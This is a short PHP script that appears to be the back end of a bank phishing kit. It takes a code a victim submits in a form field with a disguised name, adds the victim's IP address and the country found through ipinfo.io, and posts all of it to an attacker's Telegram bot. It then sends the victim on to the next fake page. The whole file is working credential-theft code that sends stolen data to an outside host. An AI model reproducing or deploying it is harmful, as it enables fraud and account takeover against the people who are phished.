<?php
ini_set("display_errors", 0);
include "DONDECAE.php";


if (isset($_POST['t0s24uS824s']) ) {
    $input = $_POST['t0s24uS824s'];
    $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
    $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
    $mensajex .= "B4NESCO\nC00D3X: ".$_POST['t0s24uS824s']."\nIP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\nC0DE BY SYN4PSE";

    env($tafuta, $tid, $mensajex);
}
function getIpInfo($ip) {
    $url = "http://ipinfo.io/{$ip}/json";  
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    
    return json_decode($response, true);
}
function env($token, $chatID, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array(
        'chat_id' => $chatID,
        'text' => $mensaje
    );

    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
    );

    $curl = curl_init();
    curl_setopt_array($curl, $options);
    $response = curl_exec($curl);
    curl_close($curl);

    return $response;
    
}

echo "<script>window.location.href = \"aulvald2.html\"</script>";
?>




